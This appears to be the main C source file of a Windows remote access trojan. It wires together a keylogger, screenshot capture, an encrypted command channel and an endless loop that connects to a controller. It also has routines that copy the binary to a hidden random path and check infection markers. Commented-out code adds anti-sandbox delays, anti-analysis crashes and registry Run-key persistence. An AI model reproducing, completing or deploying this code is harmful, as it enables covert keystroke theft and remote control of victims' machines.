#include <stdlib.h>
#include <time.h>
#include <windows.h>
#include "net/interface.h"
#include "screenshot.h"
#include "client.h"
#include "SCL2.h"
#include "keylogger/keylogger.h"
#include "memProtect.h"
#include "reg.h"
#include "types.h"
#include "random.h"
#include "reg.h"
#include "winmain.h"

void(*winmain_CRASH)(void) = NULL;

void winmain_Move(FILE *f)
{
	return; //@GRESHKA: ZASHTITA!

	char* rndPath = random_Path();
	char* rndName = random_Ascii(10);

	int newPathLen = strlen(rndPath) + strlen(rndName) + 3;
	char* newPath = malloc(newPathLen + sizeof(char));
	memset(newPath, 0, newPathLen);
	snprintf(newPath, newPathLen, "%s\\%s", rndPath, rndName);
	free(rndPath);
	free(rndName);
 
	FILE *nf = fopen(newPath, "wb");

	if(!nf)
	{
		free(newPath);

		return;
	}

	fseeko64(f, 0, SEEK_END);
	uint64 fsize = ftello64(f);
	fseeko64(f, 0, SEEK_END);

	uint8* mdata = malloc(fsize);
	memset(mdata, 0, fsize);

	if(!fread(mdata, 1, fsize, f))
	{
		free(mdata);
		fclose(nf);
		remove(newPath);
		free(newPath);

		return;
	}

	if(!fwrite(mdata, 1, fsize, nf))
	{
		free(mdata);
		fclose(nf);
		remove(newPath);
		free(newPath);

		return;
	}

	if(!fwrite(WINMAIN_SIGIL, 1, WINMAIN_SIGIL_LEN, nf))
	{
		free(mdata);
		fclose(nf);
		remove(newPath);
		free(newPath);

		return;
	}

	fclose(nf);
	SetFileAttributes(newPath, FILE_ATTRIBUTE_HIDDEN);
	free(newPath);
}

int winmain_IsInfected(char* path, FILE** of)
{
	FILE *f = fopen(path, "r");

	if(!f)
	{
		return -1;
	}

	fseeko64(f, 0, SEEK_END);
	uint64 fsize = ftello64(f);

	fseeko64(f, fsize - WINMAIN_SIGIL_LEN, 0);

	uint8* data = malloc(WINMAIN_SIGIL_LEN);
	memset(data, 0, WINMAIN_SIGIL_LEN);
	fread(data, 1, WINMAIN_SIGIL_LEN, f);

	int rv = memcmp(WINMAIN_SIGIL, data, WINMAIN_SIGIL_LEN);
	free(data);

	if(rv == 0)
	{
		fclose(f);

		return 1;
	}

	*of = f;

	return 0;
}

//@NOTE: Sorry for my bad english
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	srand(time(NULL));

	/*
	Sleep(5000); //for antiVirus sandbox

	if(GetStdHandle(STD_OUTPUT_HANDLE)) //runned in console ? no no no no
	{
		winmain_CRASH(); //function with NULL value
	}*/

//	reg_Init();
//	reg_SetupInRun("Hello world!");
//	reg_Destroy();

	SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);

	if(!net_Init())
	{
		ExitProcess(0);
	}

	_scl_info SCL_INFO;
	memset(&SCL_INFO, 0, sizeof(_scl_info));
	SCL_INFO.size = sizeof(_scl_info);
	SCL_INFO.seed = 0xFF83DA;
	SCL_INFO.upSeed = 0x3FD3F;
	SCL_INFO.upMax = 0xFF;
	SCL_INFO.randSalt = 0x10FA;
	SCL_INFO.ranHelper = 0x2F;

	int sclKeyLen = sizeof(_scl_key) + SCL2_DEF_KEY_LEN + SCL2_DEF_KEY_LEN; //struct size + key size + salt size
	_scl_key *SCL_KEY = (_scl_key*)malloc(sclKeyLen);
	memset(SCL_KEY, 0, sclKeyLen);

	SCL_KEY->size = sclKeyLen;
	SCL_KEY->times = 15;
	SCL_KEY->keyLen = SCL2_DEF_KEY_LEN;
	SCL_KEY->key = malloc(SCL2_DEF_KEY_LEN);
	SCL_KEY->salt = malloc(SCL2_DEF_KEY_LEN);
	memcpy(SCL_KEY->key, SCL2_DEF_KEY_KEY, SCL2_DEF_KEY_LEN);
	memcpy(SCL_KEY->salt, SCL2_DEF_KEY_SALT, SCL2_DEF_KEY_LEN);
	SCL2_Init(SCL_INFO, &SCL_KEY);

	keylogger_Start();
	screenshot_Init();
	client_Prepare();
	
	while(1)
	{
		client_Connect();
		client_ConnectionHandle();
		CLIENT_SLEEP_BETWEEN_FUNC();
	}
	
	ExitProcess(0);
}

/* IS COMPUTER INFECTED
	reg_Init();
	int rv = reg_IsCompInfected();
	reg_Destroy();

	printf("%d\n", rv);

	if(rv == 0)
	{
		puts("NO SLAVE RUNNING!\n");
		Sleep(1000 * 100);
	}else{
		puts("SLAVE IS RUNNING!\n");
	}
*/

/* IS EXE INFECTED
	ulong pathLen = 2048;
	char* path = malloc(pathLen);
	memset(path, 0, pathLen);

	if(!GetModuleFileName(NULL, path, pathLen - 1))
	{
		free(path);

		winmain_CRASH();
	}

	FILE *slaveF;

	int rv = winmain_IsInfected(path, &slaveF);
	free(path);
	
	if(rv != 0){ //not infected
		winmain_CRASH();
	}
*/